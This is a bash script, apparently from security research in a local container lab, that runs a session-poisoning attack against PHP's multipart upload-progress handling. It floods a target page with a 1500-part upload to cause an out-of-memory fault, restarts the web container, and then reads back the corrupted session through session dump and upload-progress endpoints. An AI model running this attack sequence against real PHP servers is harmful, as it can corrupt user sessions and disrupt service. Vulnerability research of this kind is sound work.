#!/usr/bin/env bash
# 1) OOM poison sess_*  2) restart web  3) consume poison via JSON + small multipart (cleanup path).
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROBE="${PROBE:-$SCRIPT_DIR/oom_rfc1867_http_probe.py}"
HOST="${1:-127.0.0.1}"
PORT="${2:-8080}"
COOKIE='PHPSESSID=abcdef0123456789abcdef0123456789'
OUT="${OUT:-$HOME/blackhole-captures/third-request-$(date +%Y%m%d-%H%M%S).txt}"
RESTART="${RESTART:-1}"

mkdir -p "$(dirname "$OUT")"
exec > >(tee "$OUT") 2>&1
echo "=== third-request probe $(date -Is) ==="

echo "--- 1 OOM poison ---"
python3 "$PROBE" --host "$HOST" --port "$PORT" --path /oom_target.php \
  --scenario progress-many-parts --parts 1500 --label tr-oom --timeout 60 || true

podman exec blackhole-lab_web_1 wc -c /tmp/sess_abcdef0123456789abcdef0123456789 2>/dev/null || true

if [[ "$RESTART" == 1 ]]; then
  echo "--- 2 restart web (cold workers) ---"
  (cd ~/blackhole-lab && podman-compose -f compose.yaml -f compose.debug.yaml restart web)
  sleep 4
fi

echo "--- 3 GET session_dump.php ---"
curl -fsS --max-time 15 -H "Cookie: $COOKIE" "http://${HOST}:${PORT}/session_dump.php" || echo "dump=fail"

echo "--- 4 GET upload_progress.php ---"
curl -fsS --max-time 15 -H "Cookie: $COOKIE" "http://${HOST}:${PORT}/upload_progress.php" | head -c 4000 || echo "json=fail"
echo

echo "--- 5 small multipart POST (progress-many-parts, 2) ---"
timeout 30 python3 "$PROBE" --host "$HOST" --port "$PORT" --path /oom_target.php \
  --scenario progress-many-parts --parts 2 --label tr-post-small || echo "small_post=timeout"

echo "--- 6 GET session_dump after small POST ---"
curl -fsS --max-time 15 -H "Cookie: $COOKIE" "http://${HOST}:${PORT}/session_dump.php" || echo "dump2=fail"

echo "--- 7 sess file size ---"
podman exec blackhole-lab_web_1 wc -c /tmp/sess_abcdef0123456789abcdef0123456789 2>/dev/null || true
echo "wrote $OUT"
